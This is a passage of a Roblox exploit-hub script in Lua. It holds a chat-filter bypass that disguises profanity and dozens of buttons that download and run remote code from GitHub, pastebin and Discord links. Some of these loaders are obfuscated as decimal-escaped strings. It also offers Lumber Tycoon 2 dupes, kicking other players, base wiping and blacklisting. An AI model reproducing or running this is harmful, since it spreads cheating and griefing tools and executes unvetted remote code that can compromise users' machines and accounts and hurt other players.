		---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


		local chat = TextBox.Text

		---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


		local tabl = {}
		for i = 1, #chat do
			local chara = chat:sub(i,i)
			if string.lower(chara) == "w" then
				chara = "å±±"
			elseif string.lower(chara) == "n" then
				chara = "á´¨"

				---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


			elseif string.lower(chara) == "i" then
				chara = "IÌ²"
			elseif string.lower(chara) == "t" then
				chara = "LÌ¶"
			elseif string.lower(chara) == "c" then
				chara = "Â¢ÍÌ¡"
			elseif string.lower(chara) == "k" then
				chara = "é•¿"

				---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


			elseif string.lower(chara) == "v" then
				chara = "VÌ¾ÍƒÍ‹Ì³âƒ¨"
			elseif string.lower(chara) == "fuck" then
				chara ="Ô²uÂ¢Â¢k"
			elseif string.lower(chara) == "o" then
				chara = "OÌµÌÌÍœÌ Ì²"
			elseif string.lower(chara) == "p" then
				chara = "qÌ·"
			elseif string.lower(chara) == "a" then
				chara = "Î±Ì²"
			elseif string.lower(chara) == "j" then
				chara = "ä¸¿"
			elseif string.lower(chara) == "g" then
				chara = "ðš"
			elseif string.lower(chara) == "naked" then
				chara = "NÌ¶Ì·Ì²Î±Ì¶Ì·Ì²kÌ¶Ì·Ì²â‚¬Ì¶Ì·Ì²dÌ¶Ì·Ì²"
			elseif string.lower(chara) == "m" then
				chara = "çˆª"
			elseif string.lower(chara) == "l" then
				chara = "lÌ’ÌšÌ’Ì²âƒ¨"
			elseif string.lower(chara) == "bitch" then
				chara = "BÌ¶âƒ¨Ì²lÌ¶âƒ¨Ì²tÌ¶âƒ¨Ì²â‚¬Ì¶âƒ¨Ì²hÌ¶âƒ¨Ì²"
			elseif string.lower(chara) == "u" then
				chara = "Æ²"
			elseif string.lower(chara) == "b" then
				chara = "Î²Ì¶Ì¶âƒ¨"
			elseif string.lower(chara) == "f" then
				chara = "åƒ"
			elseif string.lower(chara) == "r" then
				chara = "â…‚âƒ¨"
			elseif string.lower(chara) == "d" then
				chara = "ÆŠ"
			elseif string.lower(chara) == "y" then
				chara = "ä¸«"
			elseif string.lower(chara) == "z" then
				chara = "â²Œ"
			elseif string.lower(chara) == "s" and bypass_s then
				chara = "âŸ†" --TODO: Find better S character
			elseif string.lower(chara) == " " then
				chara = "  "
			elseif string.lower(chara) == "h" then
				chara = "å»¾"
			end
			---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()

			---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()
			table.insert(tabl, chara)
		end
		chat = ""
		for i,v in pairs(tabl) do
			chat = chat..v

			---loadstring("\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\116\97\98\108\44\32\99\104\97\114\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\99\104\97\116\32\61\32\34\34\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\116\97\98\108\41\32\100\111\10\32\32\32\32\32\32\32\32\99\104\97\116\32\61\32\99\104\97\116\46\46\118\10\32\32\32\32\101\110\100\10\32\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\99\104\97\116\44\32\34\65\108\108\34\41\10\101\110\100\41\10")()


		end
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chat, "All")
	end)
end)

HUBSTAB.Name = "HUBSTAB"
HUBSTAB.Parent = Main
HUBSTAB.BackgroundColor3 = Color3.fromRGB(106, 36, 140)
HUBSTAB.Position = UDim2.new(0.283809513, 0, 0.11764691, 0)
HUBSTAB.Size = UDim2.new(0, 376, 0, 270)
HUBSTAB.Visible = false

TextButton_6.Parent = HUBSTAB
TextButton_6.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_6.Position = UDim2.new(0.045212768, 0, 0.0766423345, 0)
TextButton_6.Size = UDim2.new(0, 342, 0, 39)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "VHUB GUI"
TextButton_6.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_6.TextSize = 31.000
TextButton_6.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt'),true))()
end)

TextButton_7.Parent = HUBSTAB
TextButton_7.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_7.Position = UDim2.new(0.045212768, 0, 0.262773722, 0)
TextButton_7.Size = UDim2.new(0, 342, 0, 39)
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "Sushi Hub"
TextButton_7.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_7.TextSize = 31.000
TextButton_7.TextWrapped = true
TextButton_7.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
end)

TextButton_8.Parent = HUBSTAB
TextButton_8.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_8.Position = UDim2.new(0.0452127643, 0, 0.44890511, 0)
TextButton_8.Size = UDim2.new(0, 342, 0, 39)
TextButton_8.Font = Enum.Font.SourceSans
TextButton_8.Text = "LX Hub"
TextButton_8.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_8.TextSize = 31.000
TextButton_8.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Gogogamer61/LXHub-Main/main/LXHub%20Main%20Script'),true))()
end)
TextButton_9.Parent = HUBSTAB
TextButton_9.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_9.Position = UDim2.new(0.0452127643, 0, 0.627737224, 0)
TextButton_9.Size = UDim2.new(0, 342, 0, 39)
TextButton_9.Font = Enum.Font.SourceSans
TextButton_9.Text = "Fire X Hub"
TextButton_9.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_9.TextSize = 31.000
TextButton_9.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/firex/main/firex'))()
end)
TextButton_10.Parent = HUBSTAB
TextButton_10.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_10.Position = UDim2.new(0.045212768, 0, 0.802919686, 0)
TextButton_10.Size = UDim2.new(0, 342, 0, 39)
TextButton_10.Font = Enum.Font.SourceSans
TextButton_10.Text = "PRO Hub"
TextButton_10.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_10.TextSize = 31.000
TextButton_10.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Kindasua/v.1-beta/main/Fixed%20bugs%20v.1%20beta"), true))()
end)
end)
End1Section:NewButton("Histy Hub (Bee swarm simulator)", "🐝🐝🐝🐝", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
end)
End1Section:NewButton("Qoucx Hub Bubble Gum simulator", "Bubble gum simulator script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/BubbleGumQoucxHub.lua"))()
end)
End1Section:NewButton("ATR Hub Blox Fruits", "Blox 🍑🍓 fruit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/ATR",true))()
end)
End1Section:NewButton("Thunder Z Blox fruits", "ahuhhh", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-05/HUB/main/Script"))()
end)
End1Section:NewButton("Strike Hub King legacy", "Strike", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Strikehubv2z/StormSKz/main/All_in_one"))()
end)
End1Section:NewButton("NoobHub King Legacy", "Noob", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/script/main/kl'))() 
end)
LocalSection:NewButton("Xray Works all games PRESS E TOGGLE", "ButtonInfo", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
--made by ScareCrowV3RM
local xrayHotkey = Enum.KeyCode.E

local uis = game:GetService("UserInputService")


local xrayOn = false


uis.InputBegan:Connect(function(inp, processed)
	
	
	if processed then return end
	
	
	if inp.KeyCode == xrayHotkey then
		
		
		xrayOn = not xrayOn
		
		
		for i, descendant in pairs(workspace:GetDescendants()) do
				
			if descendant:IsA("BasePart") then
				
				if xrayOn then
					
					if not descendant:FindFirstChild("OriginalTransparency") then
						
						local originalTransparency = Instance.new("NumberValue")
						originalTransparency.Name = "OriginalTransparency"
						originalTransparency.Value = descendant.Transparency
						originalTransparency.Parent = descendant
					end
					
					descendant.Transparency = 0.5
					
				else
					descendant.Transparency = descendant.OriginalTransparency.Value
				end
			end
		end
	end
end)
end)
Section:NewButton("Lumber Tycoon 2 Script", "Subscribe to dragon dupe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/VcBXgr4A'))();
end)
Section:NewButton("ToolGiver v2", "Subscribe to ghostplayer👍", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\106\104\89\119\107\50\52\52\39\41\41\40\41\10")()
end)
Section:NewButton("Auto Chat", "Subscribe to ghostplayer👍", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\48\120\113\74\98\72\98\52\39\41\41\40\41\10")()
end)
LocalSection:NewButton("Kick Yourself when you die", "made by ghostplayer and subscribe to him👍", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/vsFeeipV'))()
end)
Section:NewButton("Lumber Tycoon 2 OP Kick people and misc", "æ", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\65\115\121\110\99\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\89\90\88\87\65\78\47\108\108\108\73\73\73\47\109\97\105\110\47\89\111\117\46\116\120\116\34\41\41\40\41")()
end)
LocalSection:NewButton("Spectate Players", "view players", function()
    local runDummyScript = function(f,scri)
local oldenv = getfenv(f)
local newenv = setmetatable({}, {
__index = function(_, k)
if k:lower() == 'script' then
return scri
else
return oldenv[k]
end
end
})
setfenv(f, newenv)
ypcall(function() f() end)
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting")) 
mas.Name = "CompiledModel"
o1 = Instance.new("ScreenGui")
o2 = Instance.new("Frame")
o3 = Instance.new("TextButton")
o4 = Instance.new("TextButton")
o5 = Instance.new("TextLabel")
o6 = Instance.new("ImageButton")
o7 = Instance.new("LocalScript")
o1.Name = "SpectateGui"
o1.Parent = mas
o2.Name = "Bar"
o2.Parent = o1
o2.Position = UDim2.new(-1,-100,0.87999999523163,-50)
o2.Size = UDim2.new(0,200,0,50)
o2.Position = UDim2.new(-1,-100,0.87999999523163,-50)
o2.BackgroundColor3 = Color3.new(0, 0, 0)
o2.BackgroundTransparency = 0.20000000298023
o2.BorderSizePixel = 5
o3.Name = "Previous"
o3.Parent = o2
o3.Size = UDim2.new(0.25,0,1,0)
o3.Text = "<"
o3.BackgroundColor3 = Color3.new(0.52549, 0.52549, 0.52549)
o3.BorderColor3 = Color3.new(0.509804, 0.796079, 1)
o3.BorderSizePixel = 0
o3.Font = Enum.Font.SourceSans
o3.FontSize = Enum.FontSize.Size48
o3.TextColor3 = Color3.new(1, 1, 1)
o4.Name = "Next"
o4.Parent = o2
o4.Position = UDim2.new(1,0,0,0)
o4.Size = UDim2.new(-0.25,0,1,0)
o4.Text = ">"
o4.Position = UDim2.new(1,0,0,0)
o4.BackgroundColor3 = Color3.new(0.52549, 0.52549, 0.52549)
o4.BorderColor3 = Color3.new(0.509804, 0.796079, 1)
o4.BorderSizePixel = 0
o4.Font = Enum.Font.SourceSans
o4.FontSize = Enum.FontSize.Size48
o4.TextColor3 = Color3.new(1, 1, 1)
o5.Name = "Title"
o5.Parent = o2
o5.Position = UDim2.new(0.27500000596046,0,0,0)
o5.Size = UDim2.new(0.44999998807907,0,1,0)
o5.Text = ""
o5.Position = UDim2.new(0.27500000596046,0,0,0)
o5.BackgroundColor3 = Color3.new(1, 1, 1)
o5.BackgroundTransparency = 1
o5.Font = Enum.Font.SourceSans
o5.FontSize = Enum.FontSize.Size14
o5.TextColor3 = Color3.new(1, 1, 1)
o5.TextScaled = true
o5.TextWrapped = true
o6.Name = "Button"
o6.Parent = o1
o6.Position = UDim2.new(0,0,0.5,-25)
o6.Size = UDim2.new(0,50,0,50)
o6.Position = UDim2.new(0,0,0.5,-25)
o6.BackgroundColor3 = Color3.new(1, 1, 1)
o6.BackgroundTransparency = 0.30000001192093
o6.BorderSizePixel = 5
o6.Image = "http://www.roblox.com/asset/?id=176106970"
o7.Parent = o1
table.insert(cors,coroutine.create(function()
wait()
runDummyScript(function()

cam = game.Workspace.CurrentCamera

local bar = script.Parent.Bar
local title = bar.Title
local prev = bar.Previous
local nex = bar.Next
local button = script.Parent.Button

function get()
	for _,v in pairs(game.Players:GetPlayers())do
		if v.Name == title.Text then
			return(_)
		end
	end
end


local debounce = false
button.MouseButton1Click:connect(function()
	if debounce == false then debounce = true
		bar:TweenPosition(UDim2.new(.5,-100,0.88,-50),"In","Linear",1,true)
		pcall(function()
				title.Text = game.Players:GetPlayerFromCharacter(cam.CameraSubject.Parent).Name
		end)
	elseif debounce == true then debounce = false
		pcall(function() cam.CameraSubject = game.Players.LocalPlayer.Character.Humanoid end)
			bar:TweenPosition(UDim2.new(-1,-100,0.88,-50),"In","Linear",1,true)
		end
end)

prev.MouseButton1Click:connect(function()
	wait(.1)
	local players = game.Players:GetPlayers()
	local num = get()
	if not pcall(function() 
		cam.CameraSubject = players[num-1].Character.Humanoid
		end) then
		cam.CameraSubject = players[#players].Character.Humanoid
	end
pcall(function()
				title.Text = game.Players:GetPlayerFromCharacter(cam.CameraSubject.Parent).Name
		end)
end)

nex.MouseButton1Click:connect(function()
	wait(.1)
	local players = game.Players:GetPlayers()
	local num = get()
	if not pcall(function() 
		cam.CameraSubject = players[num+1].Character.Humanoid
		end) then
		cam.CameraSubject = players[1].Character.Humanoid
	end
pcall(function()
				title.Text = game.Players:GetPlayerFromCharacter(cam.CameraSubject.Parent).Name
		end)
end)


end,o7)
end))
mas.Parent = workspace
mas:MakeJoints()
local mas1 = mas:GetChildren()
for i=1,#mas1 do
	mas1[i].Parent = game:GetService("Players").LocalPlayer.PlayerGui 
	ypcall(function() mas1[i]:MakeJoints() end)
end
mas:Destroy()
for i=1,#cors do
coroutine.resume(cors[i])
end
end)

Section:NewButton("MetaWare Blox Fruits", "Metarobot", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/x2FIWz/SCRIPT/main/MOBILE/METAWARE.lua'))()
end)
Section:NewButton("Dark Jn Gui Script op", "Credits to owner", function()
    loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/988380074988429382/988380544884703262/out.lua",true))()
end)
Section:NewButton("Jailbreak Gui", "use this script to easy escape", function()
    loadstring(game:GetObjects("rbxassetid://3762448307")[1].Source)()
end)
Section:NewButton("Timber Script", "Script idk lol", function()
    loadstring(game:HttpGet"https://thedragonslayer2.github.io")()
end)
Tab1Section:NewButton("Click For Updates", "ButtonInfo", function()
    game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Updates",
                Text = "Added more scripts more updates coming soon",
                Duration = 12,
                })
end)

Section:NewButton("Mining Simulator 2 Script", "Cannot be dragged", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/MS2_WHAT.lua"))()
    
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
end)
LocalSection:NewButton("2016 old Roblox ui", "Nostalgia😟", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/kosuke14/REBOYHub/main/games/2016_Roblox.lua'))()
end)
Section:NewButton("Build  a boat for treasure fast farm ", "most fastest auto farm script", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/cLZAV53x'))()
end)
Piano2Section:NewButton("Piano Autoplay gui v2", "Yes", function()
    loadstring(game:HttpGet(("https://cdn.discordapp.com/attachments/988479599774162974/988479688408182824/out.lua"),true))()
end)
End1Section:NewButton("Shiro Hub lumber tycoon 2", "Lumber tycoon 2 script", function()
    local shiroshubv2 = Instance.new("ScreenGui")
local mainframe = Instance.new("Frame")
local Minimise = Instance.new("TextButton")
local Dupe = Instance.new("TextButton")
local DupeFrame = Instance.new("Frame")
local CountAxes = Instance.new("TextButton")
local StoreAxes = Instance.new("TextButton")
local RestoreAxes = Instance.new("TextButton")
local DupeSlot = Instance.new("TextBox")
local MoneyDupeSlot = Instance.new("TextBox")
local MoneyDupe = Instance.new("TextLabel")
local AxeDupe = Instance.new("TextLabel")
local Dupe_2 = Instance.new("TextLabel")
local MoneyStep1 = Instance.new("TextButton")
local MoneyStep2 = Instance.new("TextButton")
local DupeStep1 = Instance.new("TextButton")
local DupeStep2 = Instance.new("TextButton")
local Main = Instance.new("TextButton")
local MainFrame = Instance.new("Frame")
local Speed = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local GoldenAxe = Instance.new("TextButton")
local TP = Instance.new("TextButton")
local Paint = Instance.new("TextButton")
local AllBp = Instance.new("TextButton")
local CarFlight = Instance.new("TextButton")
local NoFog = Instance.new("TextButton")
local ResetCharacter = Instance.new("TextButton")
local NoClip = Instance.new("TextButton")
local InfJump = Instance.new("TextButton")
local jesus = Instance.new("TextButton")
local FastDelBps = Instance.new("TextButton")
local Jump = Instance.new("TextButton")
local SpeedValue = Instance.new("TextBox")
local JumpValue = Instance.new("TextBox")
local SecretWalkSpeed = Instance.new("TextButton")
local Plot = Instance.new("TextButton")
local PlotFrame = Instance.new("Frame")
local BlackListAll = Instance.new("TextButton")
local MaxLand = Instance.new("TextButton")
local WipeBase = Instance.new("TextButton")
local AntiBLAll = Instance.new("TextButton")
local CopyBase = Instance.new("TextButton")
local PlayerName = Instance.new("TextBox")
local You = Instance.new("TextLabel")
local Others = Instance.new("TextLabel")
local Wood = Instance.new("TextButton")
local WoodFrame = Instance.new("Frame")
local SellWood = Instance.new("TextButton")
local SellPlanks = Instance.new("TextButton")
local ModWood = Instance.new("TextButton")
local TPWood = Instance.new("TextButton")
local TPPlanks = Instance.new("TextButton")
local RemoveTrees = Instance.new("TextButton")
local TP_2 = Instance.new("TextButton")
local TPFrame = Instance.new("Frame")
local StoreWoodRUs = Instance.new("TextButton")
local StoreLand = Instance.new("TextButton")
local StoreCars = Instance.new("TextButton")
local GreenBox = Instance.new("TextButton")
local StoreFancy = Instance.new("TextButton")
local StoreLogic = Instance.new("TextButton")
local Spawn = Instance.new("TextButton")
local IceWood = Instance.new("TextButton")
local Lodge = Instance.new("TextButton")
local Dock = Instance.new("TextButton")
local Bridge = Instance.new("TextButton")
local Cave = Instance.new("TextButton")
local StrangeMan = Instance.new("TextButton")
local YellowWood = Instance.new("TextButton")
local Volcano = Instance.new("TextButton")
local Palm = Instance.new("TextButton")
local StoreBobs = Instance.new("TextButton")
local EndTimes = Instance.new("TextButton")
local Swamp = Instance.new("TextButton")
local StoreFineArts = Instance.new("TextButton")
local Hub = Instance.new("TextButton")
local HubFrame = Instance.new("Frame")
local Blood = Instance.new("TextButton")
local Venyx = Instance.new("TextButton")
local BringUp = Instance.new("TextButton")
local LightLumber = Instance.new("TextButton")
local Ferry = Instance.new("TextButton")
local JohiroAxeDupe = Instance.new("TextButton")
local Credits = Instance.new("TextButton")
local CreditsFrame = Instance.new("Frame")
local MadeBy = Instance.new("TextLabel")
local SnowyShiro = Instance.new("TextLabel")
local Credits_2 = Instance.new("TextLabel")
local AnimeCheat = Instance.new("TextLabel")
local Johiro = Instance.new("TextLabel")
local Sten = Instance.new("TextLabel")
local Averias = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local Name = Instance.new("TextLabel")
local openbutton = Instance.new("TextButton")

shiroshubv2.Name = "shiroshubv2"
shiroshubv2.Parent = game.CoreGui

mainframe.Name = "mainframe"
mainframe.Parent = shiroshubv2
mainframe.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
mainframe.BorderColor3 = Color3.fromRGB(255, 255, 255)
mainframe.BorderSizePixel = 0
mainframe.Position = UDim2.new(0.202159837, 0, 0.372229487, 0)
mainframe.Size = UDim2.new(0, 400, 0, 280)
mainframe.Visible = false

Minimise.Name = "Minimise"
Minimise.Parent = mainframe
Minimise.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Minimise.BorderColor3 = Color3.fromRGB(128, 39, 211)
Minimise.BorderSizePixel = 0
Minimise.Position = UDim2.new(0.800000012, 0, 0, 0)
Minimise.Size = UDim2.new(0, 40, 0, 40)
Minimise.Font = Enum.Font.SourceSans
Minimise.Text = "-"
Minimise.TextColor3 = Color3.fromRGB(255, 255, 255)
Minimise.TextSize = 35.000
Minimise.TextWrapped = true
Minimise.MouseButton1Down:connect(function()
openbutton.Visible = true
mainframe.Visible = false
end)

Close.Name = "Close"
Close.Parent = mainframe
Close.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Close.BorderColor3 = Color3.fromRGB(128, 39, 211)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.899469852, 0, 0, 0)
Close.Size = UDim2.new(0, 40, 0, 40)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 35.000
Close.TextWrapped = true
Close.MouseButton1Down:connect(function()
shiroshubv2:Destroy()
end)

openbutton.Name = "openbutton"
openbutton.Parent = shiroshubv2
openbutton.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
openbutton.BorderColor3 = Color3.fromRGB(138, 43, 226)
openbutton.BorderSizePixel = 0
openbutton.Position = UDim2.new(0.850947857, 0, 0.935937285, 0)
openbutton.Size = UDim2.new(0, 100, 0, 30)
openbutton.Font = Enum.Font.SourceSans
openbutton.Text = "Open"
openbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
openbutton.TextSize = 32.000
openbutton.MouseButton1Down:connect(function()
mainframe.Visible = true
openbutton.Visible = false
end)

Dupe.Name = "Dupe"
Dupe.Parent = mainframe
Dupe.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
Dupe.BorderColor3 = Color3.fromRGB(138, 43, 226)
Dupe.BorderSizePixel = 0
Dupe.Position = UDim2.new(0, 0, 0.42899999, 0)
Dupe.Size = UDim2.new(0, 80, 0, 40)
Dupe.Font = Enum.Font.SourceSans
Dupe.Text = "Dupe"
Dupe.TextColor3 = Color3.fromRGB(255, 255, 255)
Dupe.TextScaled = true
Dupe.TextSize = 32.000
Dupe.TextWrapped = true
Dupe.MouseButton1Down:connect(function()
CreditsFrame.Visible = false
DupeFrame.Visible = true
HubFrame.Visible = false
MainFrame.Visible = false
PlotFrame.Visible = false
TPFrame.Visible = false
WoodFrame.Visible = false
end)

DupeFrame.Name = "DupeFrame"
DupeFrame.Parent = Dupe
DupeFrame.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
DupeFrame.BorderSizePixel = 0
DupeFrame.Position = UDim2.new(1, 0, -2.00299978, 0)
DupeFrame.Size = UDim2.new(0, 320, 0, 240)
DupeFrame.Visible = false

StoreAxes.Name = "StoreAxes"
StoreAxes.Parent = DupeFrame
StoreAxes.BackgroundColor3 = Color3.fromRGB(128, 39, 211)
StoreAxes.BorderSizePixel = 0
StoreAxes.Position = UDim2.new(0.675000012, 0, 0.26699999, 0)
StoreAxes.Size = UDim2.new(0, 98, 0, 52)
StoreAxes.Font = Enum.Font.SourceSans
StoreAxes.Text = "Store Axes"
StoreAxes.TextColor3 = Color3.fromRGB(255, 255, 255)
StoreAxes.TextScaled = true
StoreAxes.TextSize = 14.000
StoreAxes.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
StoreAxes.TextWrapped = true

